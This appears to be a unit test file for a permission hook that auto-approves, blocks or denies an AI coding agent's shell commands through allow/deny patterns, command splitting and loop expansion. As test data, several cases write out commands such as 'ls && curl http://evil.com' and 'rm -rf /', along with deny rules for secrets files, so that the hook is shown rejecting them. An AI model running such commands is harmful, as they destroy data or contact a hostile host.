"""Unit tests for auto_approval hook."""

from pathlib import Path

from hooks import auto_approval


# =========================================================================
# Layer 1 — Hardcoded blocks
# =========================================================================


class TestCheckHardcodedBlocks:
    def test_cd_blocked(self) -> None:
        result = auto_approval.check_hardcoded_blocks("cd /tmp")
        assert result is not None
        assert "cd" in result.lower()

    def test_cd_bare_blocked(self) -> None:
        assert auto_approval.check_hardcoded_blocks("cd") is not None

    def test_pushd_blocked(self) -> None:
        assert auto_approval.check_hardcoded_blocks("pushd /tmp") is not None

    def test_popd_blocked(self) -> None:
        assert auto_approval.check_hardcoded_blocks("popd") is not None

    def test_cat_blocked(self) -> None:
        result = auto_approval.check_hardcoded_blocks("cat /tmp/foo.txt")
        assert result is not None
        assert "Read" in result

    def test_cat_bare_blocked(self) -> None:
        assert auto_approval.check_hardcoded_blocks("cat") is not None

    def test_cat_substring_not_blocked(self) -> None:
        assert auto_approval.check_hardcoded_blocks("catalog foo") is None

    def test_cd_substring_not_blocked(self) -> None:
        assert auto_approval.check_hardcoded_blocks("abcd foo") is None

    def test_simple_command_allowed(self) -> None:
        assert auto_approval.check_hardcoded_blocks("ls -la") is None

    def test_empty_command(self) -> None:
        assert auto_approval.check_hardcoded_blocks("") is None


# =========================================================================
# Compound command splitting
# =========================================================================


class TestSplitCompoundCommand:
    """Parser splits on &&, ||, ;, | outside quotes."""

    def test_no_separator(self) -> None:
        assert auto_approval.split_compound_command("ls -la") is None

    def test_and(self) -> None:
        assert auto_approval.split_compound_command("ls && pwd") == ["ls", "pwd"]

    def test_or(self) -> None:
        assert auto_approval.split_compound_command("ls || pwd") == ["ls", "pwd"]

    def test_semicolon(self) -> None:
        assert auto_approval.split_compound_command("ls; pwd") == ["ls", "pwd"]

    def test_pipe(self) -> None:
        assert auto_approval.split_compound_command("cat foo | grep bar") == ["cat foo", "grep bar"]

    def test_triple_chain(self) -> None:
        assert auto_approval.split_compound_command("ls && pwd && git status") == ["ls", "pwd", "git status"]

    def test_mixed_separators(self) -> None:
        assert auto_approval.split_compound_command("cat foo | grep bar || echo fallback") == ["cat foo", "grep bar", "echo fallback"]

    def test_operators_inside_single_quotes(self) -> None:
        assert auto_approval.split_compound_command("echo '&& || ; |'") is None

    def test_operators_inside_double_quotes(self) -> None:
        assert auto_approval.split_compound_command('git commit -m "fix; update && clean"') is None

    def test_real_separator_with_quoted_operators(self) -> None:
        result = auto_approval.split_compound_command('echo "hello && world" && pwd')
        assert result == ['echo "hello && world"', "pwd"]

    def test_escaped_quote_in_double_quotes(self) -> None:
        assert auto_approval.split_compound_command(r'echo "say \"hi\"" && pwd') == [r'echo "say \"hi\""', "pwd"]

    def test_empty_parts_filtered(self) -> None:
        assert auto_approval.split_compound_command("ls &&  && pwd") == ["ls", "pwd"]

    def test_pipe_not_confused_with_or(self) -> None:
        """Single | splits, || splits separately — no cross-contamination."""
        result = auto_approval.split_compound_command("a | b || c")
        assert result == ["a", "b", "c"]


# =========================================================================
# Compound command dispatch
# =========================================================================


COMPOUND_SETTINGS = {
    "permissions": {
        "deny": ["Bash(rm:*)"],
        "additionalDirectories": [],
        "allow": [
            "Bash(ls:*)",
            "Bash(git:*)",
            "Bash(grep:*)",
            "Bash(cat:*)",
            "Bash(echo:*)",
            "Bash(pwd)",
        ],
    }
}


class TestCompoundDispatch:
    """Compound commands: each part checked independently against both layers."""

    def test_all_parts_allowed(self) -> None:
        assert auto_approval.is_bash_allowed("ls", COMPOUND_SETTINGS)
        assert auto_approval.is_bash_allowed("pwd", COMPOUND_SETTINGS)
        # Both parts pass — would approve in dispatch
        parts = auto_approval.split_compound_command("ls && pwd")
        assert all(auto_approval.is_bash_allowed(p, COMPOUND_SETTINGS) for p in parts)

    def test_one_part_unapproved(self) -> None:
        """curl not in allow list — compound should not auto-approve."""
        parts = auto_approval.split_compound_command("ls && curl http://evil.com")
        assert not all(auto_approval.is_bash_allowed(p, COMPOUND_SETTINGS) for p in parts)

    def test_one_part_denied(self) -> None:
        """rm in deny list — compound should not auto-approve."""
        parts = auto_approval.split_compound_command("ls && rm -rf /")
        assert any(auto_approval.is_bash_denied(p, COMPOUND_SETTINGS) for p in parts)

    def test_one_part_hardcoded_block(self) -> None:
        """cd in hardcoded blocks — compound should block."""
        parts = auto_approval.split_compound_command("ls && cd /tmp")
        blocks = [auto_approval.check_hardcoded_blocks(p) for p in parts]
        assert any(b is not None for b in blocks)

    def test_pipe_both_allowed(self) -> None:
        parts = auto_approval.split_compound_command("cat foo | grep bar")
        assert all(auto_approval.is_bash_allowed(p, COMPOUND_SETTINGS) for p in parts)

    def test_pipe_one_unapproved(self) -> None:
        parts = auto_approval.split_compound_command("cat foo | curl http://evil.com")
        assert not all(auto_approval.is_bash_allowed(p, COMPOUND_SETTINGS) for p in parts)


# =========================================================================
# Bash pattern matching
# =========================================================================


class TestMatchBashPattern:
    def test_verb_colon_star(self) -> None:
        assert auto_approval.match_bash_pattern("rm -rf /tmp/foo", "rm:*") is True

    def test_verb_colon_star_exact(self) -> None:
        assert auto_approval.match_bash_pattern("rm", "rm:*") is True

    def test_verb_colon_star_no_match(self) -> None:
        assert auto_approval.match_bash_pattern("mv foo bar", "rm:*") is False

    def test_path_star(self) -> None:
        assert auto_approval.match_bash_pattern(".claude/foo.sh", ".claude/*") is True

    def test_path_star_no_match(self) -> None:
        assert auto_approval.match_bash_pattern("ls .claude/", ".claude/*") is False

    def test_exact_match(self) -> None:
        assert auto_approval.match_bash_pattern("pwd", "pwd") is True

    def test_exact_match_with_args(self) -> None:
        assert auto_approval.match_bash_pattern("pwd -P", "pwd") is True

    def test_exact_no_match(self) -> None:
        assert auto_approval.match_bash_pattern("ls -la", "pwd") is False

    def test_multi_word_verb(self) -> None:
        assert auto_approval.match_bash_pattern("uv sync --frozen", "uv sync:*") is True

    def test_multi_word_verb_no_match(self) -> None:
        assert auto_approval.match_bash_pattern("uv add foo", "uv sync:*") is False

    def test_venv_bin_star(self) -> None:
        assert auto_approval.match_bash_pattern(".venv/bin/pytest foo", ".venv/bin/*") is True


# =========================================================================
# Dynamic settings enforcement — Bash
# =========================================================================


SAMPLE_SETTINGS = {
    "permissions": {
        "deny": [],
        "additionalDirectories": [".", "~/projects"],
        "allow": [
            "Edit",
            "Write",
            "Bash(ls:*)",
            "Bash(rm:*)",
            "Bash(git:*)",
            "Bash(.claude/*)",
            "Bash(pwd)",
        ],
    }
}


class TestIsBashAllowed:
    def test_allowed_command(self) -> None:
        assert auto_approval.is_bash_allowed("ls -la", SAMPLE_SETTINGS) is True

    def test_allowed_git(self) -> None:
        assert auto_approval.is_bash_allowed("git status", SAMPLE_SETTINGS) is True

    def test_allowed_exact(self) -> None:
        assert auto_approval.is_bash_allowed("pwd", SAMPLE_SETTINGS) is True

    def test_allowed_path_prefix(self) -> None:
        assert auto_approval.is_bash_allowed(".claude/hooks/foo.sh", SAMPLE_SETTINGS) is True

    def test_disallowed_command(self) -> None:
        assert auto_approval.is_bash_allowed("curl http://example.com", SAMPLE_SETTINGS) is False

    def test_empty_settings(self) -> None:
        assert auto_approval.is_bash_allowed("ls", {}) is False


class TestIsBashDenied:
    def test_not_denied_when_empty(self) -> None:
        assert auto_approval.is_bash_denied("ls", SAMPLE_SETTINGS) is False

    def test_denied_when_matched(self) -> None:
        settings = {"permissions": {"deny": ["Bash(rm:*)"]}}
        assert auto_approval.is_bash_denied("rm -rf /", settings) is True

    def test_not_denied_when_no_match(self) -> None:
        settings = {"permissions": {"deny": ["Bash(rm:*)"]}}
        assert auto_approval.is_bash_denied("ls", settings) is False


# =========================================================================
# Dynamic settings enforcement — Edit/Write
# =========================================================================


class TestIsPathDenied:
    def test_not_denied_empty_list(self) -> None:
        assert auto_approval.is_path_denied("/foo/bar", "Edit", SAMPLE_SETTINGS) is False

    def test_denied_by_tool_pattern(self) -> None:
        settings = {"permissions": {"deny": ["Edit(.env)"]}}
        assert auto_approval.is_path_denied(".env", "Edit", settings) is True

    def test_denied_by_glob(self) -> None:
        settings = {"permissions": {"deny": ["Write(secrets/**)"]}}
        assert auto_approval.is_path_denied("secrets/api/key.json", "Write", settings) is True

    def test_not_denied_wrong_tool(self) -> None:
        settings = {"permissions": {"deny": ["Edit(.env)"]}}
        assert auto_approval.is_path_denied(".env", "Write", settings) is False

    def test_denied_by_blanket_tool(self) -> None:
        settings = {"permissions": {"deny": ["Edit"]}}
        assert auto_approval.is_path_denied("anything.txt", "Edit", settings) is True


class TestGlobMatch:
    def test_double_star(self) -> None:
        assert auto_approval._glob_match("a/b/c/d.txt", "a/**") is True

    def test_single_star(self) -> None:
        assert auto_approval._glob_match("a/foo.txt", "a/*.txt") is True

    def test_single_star_no_slash(self) -> None:
        assert auto_approval._glob_match("a/b/foo.txt", "a/*.txt") is False

    def test_exact(self) -> None:
        assert auto_approval._glob_match(".env", ".env") is True

    def test_no_match(self) -> None:
        assert auto_approval._glob_match("foo.txt", "bar.txt") is False


# =========================================================================
# Path resolution and directory checks
# =========================================================================


class TestIsWithinDirectory:
    def test_file_in_directory(self) -> None:
        assert auto_approval.is_within_directory(Path("/project/foo.py"), Path("/project")) is True

    def test_file_in_subdirectory(self) -> None:
        assert auto_approval.is_within_directory(Path("/project/a/b/c.py"), Path("/project")) is True

    def test_directory_equals_target(self) -> None:
        assert auto_approval.is_within_directory(Path("/project"), Path("/project")) is True

    def test_outside_directory(self) -> None:
        assert auto_approval.is_within_directory(Path("/other/foo.py"), Path("/project")) is False

    def test_prefix_attack(self) -> None:
        """'/project-evil/foo' must NOT match '/project'."""
        assert auto_approval.is_within_directory(Path("/project-evil/foo.py"), Path("/project")) is False

    def test_sibling_directory(self) -> None:
        assert auto_approval.is_within_directory(Path("/projects/other/f.py"), Path("/projects/myapp")) is False


class TestIsWithinAllowedDirs:
    def test_project_dir(self) -> None:
        settings = {"permissions": {"additionalDirectories": []}}
        assert auto_approval.is_within_allowed_dirs(Path("/project/foo.py"), Path("/project"), settings) is True

    def test_outside_project(self) -> None:
        settings = {"permissions": {"additionalDirectories": []}}
        assert auto_approval.is_within_allowed_dirs(Path("/other/foo.py"), Path("/project"), settings) is False

    def test_additional_directory(self) -> None:
        settings = {"permissions": {"additionalDirectories": ["/extra"]}}
        assert auto_approval.is_within_allowed_dirs(Path("/extra/foo.py"), Path("/project"), settings) is True

    def test_tilde_expansion(self) -> None:
        settings = {"permissions": {"additionalDirectories": ["~/projects"]}}
        dirs = auto_approval.get_allowed_directories(Path("/project"), settings)
        expected = Path.home() / "projects"
        assert expected in dirs


class TestResolvePath:
    def test_relative_path(self) -> None:
        result = auto_approval.resolve_path("foo/bar.py", Path("/project"))
        assert result == Path("/project/foo/bar.py")

    def test_absolute_path(self) -> None:
        result = auto_approval.resolve_path("/absolute/bar.py", Path("/project"))
        assert result == Path("/absolute/bar.py")

    def test_parent_traversal(self) -> None:
        result = auto_approval.resolve_path("foo/../bar.py", Path("/project"))
        assert result == Path("/project/bar.py")


class TestSettingsMerge:
    def test_unions_allow_lists(self) -> None:
        global_s = {"permissions": {"allow": ["Bash(ls:*)"], "deny": []}}
        project_s = {"permissions": {"allow": ["Bash(git:*)"], "deny": []}}
        merged = auto_approval.merge_settings(global_s, project_s)
        assert "Bash(ls:*)" in merged["permissions"]["allow"]
        assert "Bash(git:*)" in merged["permissions"]["allow"]

    def test_deduplicates(self) -> None:
        global_s = {"permissions": {"allow": ["Bash(ls:*)"], "deny": []}}
        project_s = {"permissions": {"allow": ["Bash(ls:*)"], "deny": []}}
        merged = auto_approval.merge_settings(global_s, project_s)
        assert merged["permissions"]["allow"].count("Bash(ls:*)") == 1


# =========================================================================
# Bash pattern matching with absolute-path normalization
# =========================================================================


class TestMatchBashPatternBasename:
    """Absolute-path executables should match basename patterns.

    Without normalization, an agent calling /usr/bin/python3 would not match
    Bash(python3:*), forcing manual approval. The hook normalizes the first
    word to its basename when it's an absolute path, so executable-name
    patterns match regardless of whether the command uses an absolute path
    or a bare executable name.
    """

    def test_bare_executable_matches_wildcard(self) -> None:
        assert auto_approval.match_bash_pattern("python3 -m pytest", "python3:*")

    def test_absolute_path_matches_wildcard(self) -> None:
        assert auto_approval.match_bash_pattern(
            "/usr/bin/python3 -m pytest", "python3:*"
        )

    def test_venv_absolute_path_matches_wildcard(self) -> None:
        assert auto_approval.match_bash_pattern(
            "/home/dev/projects/claude-plugins/.venv/bin/python3 -m pytest test_x.py",
            "python3:*",
        )

    def test_absolute_path_matches_exact_first_word(self) -> None:
        assert auto_approval.match_bash_pattern("/usr/bin/pwd", "pwd")

    def test_absolute_path_matches_multiword_prefix(self) -> None:
        assert auto_approval.match_bash_pattern("/usr/bin/uv sync foo", "uv sync:*")

    def test_basename_mismatch_does_not_match(self) -> None:
        assert not auto_approval.match_bash_pattern("/usr/bin/python2", "python3:*")

    def test_relative_path_executable_unchanged(self) -> None:
        # Existing .venv/bin/* style should still work
        assert auto_approval.match_bash_pattern(
            ".venv/bin/python3 -m pytest", ".venv/bin/*"
        )

    def test_path_prefix_pattern_does_not_normalize(self) -> None:
        # Bash(path/*) is a literal path-prefix pattern and should not match
        # when given an absolute path with the same basename
        assert not auto_approval.match_bash_pattern(
            "/home/dev/.venv/bin/python3", ".venv/bin/*"
        )

    def test_no_first_word_no_match(self) -> None:
        assert not auto_approval.match_bash_pattern("", "python3:*")

    def test_bare_basename_only_matches(self) -> None:
        # /python3 (no parent dir before basename) should still match
        assert auto_approval.match_bash_pattern("/python3", "python3:*")


# =========================================================================
# Env assignment stripping
# =========================================================================


class TestStripEnvAssignments:
    def test_single_bare_value(self) -> None:
        assert auto_approval._strip_env_assignments("VAR=1 cmd") == "cmd"

    def test_double_quoted_value(self) -> None:
        assert auto_approval._strip_env_assignments('VAR="x y" cmd') == "cmd"

    def test_single_quoted_value(self) -> None:
        assert auto_approval._strip_env_assignments("VAR='x y' cmd") == "cmd"

    def test_command_substitution(self) -> None:
        assert auto_approval._strip_env_assignments('VAR="$(pwd)" cmd') == "cmd"

    def test_bare_command_substitution(self) -> None:
        assert auto_approval._strip_env_assignments("VAR=$(pwd) cmd") == "cmd"

    def test_multiple_assignments(self) -> None:
        assert auto_approval._strip_env_assignments("A=1 B=2 cmd arg") == "cmd arg"

    def test_no_env_unchanged(self) -> None:
        assert auto_approval._strip_env_assignments("cmd arg") == "cmd arg"

    def test_only_env_returns_empty(self) -> None:
        assert auto_approval._strip_env_assignments("VAR=1") == ""

    def test_pattern_matches_after_strip(self) -> None:
        assert auto_approval.match_bash_pattern(
            'CLAUDE_PROJECT_DIR="$(pwd)" python3 run.py',
            "python3:*",
        )

    def test_multiple_env_pattern_match(self) -> None:
        assert auto_approval.match_bash_pattern(
            'A=1 B="x y" python3 -m pytest',
            "python3:*",
        )

    def test_env_before_cd_still_blocked(self) -> None:
        result = auto_approval.check_hardcoded_blocks("VAR=x cd /tmp")
        assert result is not None
        assert "cd" in result.lower()


# =========================================================================
# Loop expansion
# =========================================================================


class TestExpandCommand:
    def test_simple_command_passthrough(self) -> None:
        assert auto_approval.expand_command("python3 -m pytest") == [
            "python3 -m pytest"
        ]

    def test_compound_command_split(self) -> None:
        result = auto_approval.expand_command("ls && pwd")
        assert result == ["ls", "pwd"]

    def test_simple_for_loop_single_statement(self) -> None:
        cmd = "for f in a.py b.py; do python3 $f; done"
        assert auto_approval.expand_command(cmd) == ["python3 $f"]

    def test_for_loop_multiple_statements(self) -> None:
        cmd = "for f in a b; do echo $f; python3 $f; done"
        result = auto_approval.expand_command(cmd)
        assert "echo $f" in result
        assert "python3 $f" in result

    def test_while_loop_expanded(self) -> None:
        cmd = "while read line; do echo $line; done"
        assert auto_approval.expand_command(cmd) == ["echo $line"]

    def test_until_loop_expanded(self) -> None:
        cmd = "until ping -c1 host; do sleep 1; done"
        assert auto_approval.expand_command(cmd) == ["sleep 1"]

    def test_for_loop_with_compound_body(self) -> None:
        cmd = "for f in a b; do python3 $f && echo done; done"
        result = auto_approval.expand_command(cmd)
        assert "python3 $f" in result
        assert "echo done" in result

    def test_nested_for_loops_expanded(self) -> None:
        cmd = "for i in a b; do for j in c d; do echo $i$j; done; done"
        assert auto_approval.expand_command(cmd) == ["echo $i$j"]

    def test_triple_nested_loops(self) -> None:
        cmd = (
            "for i in a; do for j in b; do for k in c; "
            "do echo $i$j$k; done; done; done"
        )
        assert auto_approval.expand_command(cmd) == ["echo $i$j$k"]

    def test_for_inside_while(self) -> None:
        cmd = "while read line; do for x in $line; do echo $x; done; done"
        assert auto_approval.expand_command(cmd) == ["echo $x"]

    def test_loop_with_sibling_statements(self) -> None:
        cmd = "echo before; for j in c d; do echo inner; done; echo after"
        result = auto_approval.expand_command(cmd)
        assert result == ["echo before", "echo inner", "echo after"]

    def test_loop_between_two_siblings(self) -> None:
        cmd = "ls && for f in *.py; do python3 $f; done && echo ok"
        result = auto_approval.expand_command(cmd)
        assert result == ["ls", "python3 $f", "echo ok"]

    def test_nested_with_siblings(self) -> None:
        cmd = (
            "echo start; "
            "for i in a; do for j in b; do echo $i$j; done; done; "
            "echo end"
        )
        result = auto_approval.expand_command(cmd)
        assert result == ["echo start", "echo $i$j", "echo end"]

    def test_loop_semicolons_preserved_inside(self) -> None:
        # The inner ; separators should stay intact so the loop captures
        # cleanly; splitter must not split at depth > 0
        parts = auto_approval.split_compound_command(
            "a; for i in b; do echo; done; c"
        )
        assert parts == ["a", "for i in b; do echo; done", "c"]

    def test_empty_command_returns_empty_list(self) -> None:
        assert auto_approval.expand_command("") == []
